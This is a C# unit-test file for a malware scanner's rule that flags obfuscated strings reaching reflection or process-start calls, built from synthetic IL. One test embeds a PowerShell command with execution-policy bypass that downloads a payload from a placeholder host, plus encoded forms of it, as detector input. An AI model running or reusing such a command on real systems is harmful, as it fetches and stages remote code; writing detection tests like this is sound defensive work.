using FluentAssertions;
using MLVScan.Core.Tests.TestUtilities;
using MLVScan.Models;
using MLVScan.Models.Rules;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules
{
    public class ObfuscatedReflectiveExecutionRuleTests
    {
        private readonly ObfuscatedReflectiveExecutionRule _rule;

        public ObfuscatedReflectiveExecutionRuleTests()
        {
            _rule = new ObfuscatedReflectiveExecutionRule();
        }

        [Fact]
        public void RuleId_ReturnsExpectedValue()
        {
            _rule.RuleId.Should().Be("ObfuscatedReflectiveExecutionRule");
        }

        [Fact]
        public void RequiresCompanionFinding_ReturnsFalse()
        {
            _rule.RequiresCompanionFinding.Should().BeFalse();
        }

        [Fact]
        public void AnalyzeInstructions_DetectsCritical_WhenDecodePipelineReachesExecutionSinks()
        {
            (MethodDefinition method, ModuleDefinition module) = CreateTestMethod();
            ILProcessor il = method.Body.GetILProcessor();

            MethodReference parseMethod = CreateMethodReference(
                module,
                "System",
                "Int32",
                "Parse",
                module.TypeSystem.Int32,
                module.TypeSystem.String);

            MethodReference assemblyLoadMethod = CreateMethodReference(
                module,
                "System.Reflection",
                "Assembly",
                "Load",
                module.TypeSystem.Object,
                new ArrayType(module.TypeSystem.Byte));

            MethodReference reflectionInvokeMethod = CreateMethodReference(
                module,
                "System.Reflection",
                "MethodInfo",
                "Invoke",
                module.TypeSystem.Object,
                module.TypeSystem.Object,
                new ArrayType(module.TypeSystem.Object));

            MethodReference processStartMethod = CreateMethodReference(
                module,
                "System.Diagnostics",
                "Process",
                "Start",
                module.TypeSystem.Object,
                module.TypeSystem.String,
                module.TypeSystem.String);

            il.Append(il.Create(OpCodes.Ldstr, "112-111-119-101-114-115-104-101-108-108-46-101-120-101"));
            il.Append(il.Create(OpCodes.Call, parseMethod));
            il.Append(il.Create(OpCodes.Conv_U2));
            il.Append(il.Create(OpCodes.Call, assemblyLoadMethod));
            il.Append(il.Create(OpCodes.Callvirt, reflectionInvokeMethod));
            il.Append(il.Create(OpCodes.Ldstr, "powershell.exe"));
            il.Append(il.Create(OpCodes.Ldstr, "-ep bypass -c iwr https://example.invalid/payload -out $env:TEMP\\dl.bat"));
            il.Append(il.Create(OpCodes.Call, processStartMethod));
            il.Append(il.Create(OpCodes.Ret));

            List<ScanFinding> findings = _rule.AnalyzeInstructions(method, method.Body.Instructions, new MethodSignals()).ToList();

            findings.Should().ContainSingle();
            findings[0].Severity.Should().Be(Severity.Critical);
            findings[0].RiskScore.Should().NotBeNull();
            findings[0].RiskScore!.Value.Should().BeGreaterThanOrEqualTo(90);
            findings[0].Description.Should().ContainEquivalentOf("obfuscation/decode");
        }

        [Fact]
        public void AnalyzeInstructions_DetectsHigh_WhenDecodeMethodChangesButBehaviorCorrelates()
        {
            (MethodDefinition method, ModuleDefinition module) = CreateTestMethod();
            ILProcessor il = method.Body.GetILProcessor();

            MethodReference fromBase64Method = CreateMethodReference(
                module,
                "System",
                "Convert",
                "FromBase64String",
                new ArrayType(module.TypeSystem.Byte),
                module.TypeSystem.String);

            MethodReference encodingGetStringMethod = CreateMethodReference(
                module,
                "System.Text",
                "Encoding",
                "GetString",
                module.TypeSystem.String,
                new ArrayType(module.TypeSystem.Byte));

            MethodReference getMethodCall = CreateMethodReference(
                module,
                "System",
                "Type",
                "GetMethod",
                module.TypeSystem.Object,
                module.TypeSystem.String);

            MethodReference invokeMethod = CreateMethodReference(
                module,
                "System.Reflection",
                "MethodInfo",
                "Invoke",
                module.TypeSystem.Object,
                module.TypeSystem.Object,
                new ArrayType(module.TypeSystem.Object));

            MethodReference getFolderPathMethod = CreateMethodReference(
                module,
                "System",
                "Environment",
                "GetFolderPath",
                module.TypeSystem.String,
                module.TypeSystem.Int32);

            il.Append(il.Create(OpCodes.Ldstr, "aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvcGF5bG9hZA=="));
            il.Append(il.Create(OpCodes.Call, fromBase64Method));
            il.Append(il.Create(OpCodes.Callvirt, encodingGetStringMethod));
            il.Append(il.Create(OpCodes.Ldstr, "Run"));
            il.Append(il.Create(OpCodes.Call, getMethodCall));
            il.Append(il.Create(OpCodes.Callvirt, invokeMethod));
            il.Append(il.Create(OpCodes.Ldc_I4, 26));
            il.Append(il.Create(OpCodes.Call, getFolderPathMethod));
            il.Append(il.Create(OpCodes.Ldstr, "https://example.invalid/payload"));
            il.Append(il.Create(OpCodes.Ret));

            List<ScanFinding> findings = _rule.AnalyzeInstructions(method, method.Body.Instructions, new MethodSignals()).ToList();

            findings.Should().ContainSingle();
            findings[0].Severity.Should().Be(Severity.High);
            findings[0].RiskScore.Should().NotBeNull();
            findings[0].RiskScore!.Value.Should().BeGreaterThanOrEqualTo(70);
        }

        [Fact]
        public void AnalyzeInstructions_DoesNotDetect_WhenReflectionExistsWithoutDecodeEvidence()
        {
            (MethodDefinition method, ModuleDefinition module) = CreateTestMethod();
            ILProcessor il = method.Body.GetILProcessor();

            MethodReference getMethodCall = CreateMethodReference(
                module,
                "System",
                "Type",
                "GetMethod",
                module.TypeSystem.Object,
                module.TypeSystem.String);

            MethodReference invokeMethod = CreateMethodReference(
                module,
                "System.Reflection",
                "MethodInfo",
                "Invoke",
                module.TypeSystem.Object,
                module.TypeSystem.Object,
                new ArrayType(module.TypeSystem.Object));

            il.Append(il.Create(OpCodes.Ldstr, "Initialize"));
            il.Append(il.Create(OpCodes.Call, getMethodCall));
            il.Append(il.Create(OpCodes.Callvirt, invokeMethod));
            il.Append(il.Create(OpCodes.Ret));

            List<ScanFinding> findings = _rule.AnalyzeInstructions(method, method.Body.Instructions, new MethodSignals()).ToList();

            findings.Should().BeEmpty();
        }

        [Fact]
        public void AnalyzeInstructions_DoesNotDetect_WhenDecodeEvidenceExistsWithoutExecutionSink()
        {
            (MethodDefinition method, ModuleDefinition module) = CreateTestMethod();
            ILProcessor il = method.Body.GetILProcessor();

            MethodReference parseMethod = CreateMethodReference(
                module,
                "System",
                "Int32",
                "Parse",
                module.TypeSystem.Int32,
                module.TypeSystem.String);

            MethodReference splitMethod = CreateMethodReference(
                module,
                "System",
                "String",
                "Split",
                new ArrayType(module.TypeSystem.String),
                new ArrayType(module.TypeSystem.Char));

            il.Append(il.Create(OpCodes.Ldstr, "104-116-116-112-115"));
            il.Append(il.Create(OpCodes.Call, parseMethod));
            il.Append(il.Create(OpCodes.Conv_U2));
            il.Append(il.Create(OpCodes.Call, splitMethod));
            il.Append(il.Create(OpCodes.Ret));

            List<ScanFinding> findings = _rule.AnalyzeInstructions(method, method.Body.Instructions, new MethodSignals()).ToList();

            findings.Should().BeEmpty();
        }

        private static (MethodDefinition Method, ModuleDefinition Module) CreateTestMethod()
        {
            var assembly = TestAssemblyBuilder.Create("TestAssembly").Build();
            ModuleDefinition module = assembly.MainModule;

            var testType = new TypeDefinition(
                "TestNamespace",
                "TestClass",
                TypeAttributes.Public | TypeAttributes.Class,
                module.TypeSystem.Object);
            module.Types.Add(testType);

            var method = new MethodDefinition(
                "TestMethod",
                MethodAttributes.Public | MethodAttributes.Static,
                module.TypeSystem.Void);
            method.Body = new MethodBody(method);
            testType.Methods.Add(method);

            return (method, module);
        }

        private static MethodReference CreateMethodReference(
            ModuleDefinition module,
            string @namespace,
            string typeName,
            string methodName,
            TypeReference returnType,
            params TypeReference[] parameterTypes)
        {
            var typeReference = new TypeReference(@namespace, typeName, module, module.TypeSystem.CoreLibrary);
            var methodReference = new MethodReference(methodName, returnType, typeReference);

            foreach (TypeReference parameterType in parameterTypes)
            {
                methodReference.Parameters.Add(new ParameterDefinition(parameterType));
            }

            return methodReference;
        }
    }
}
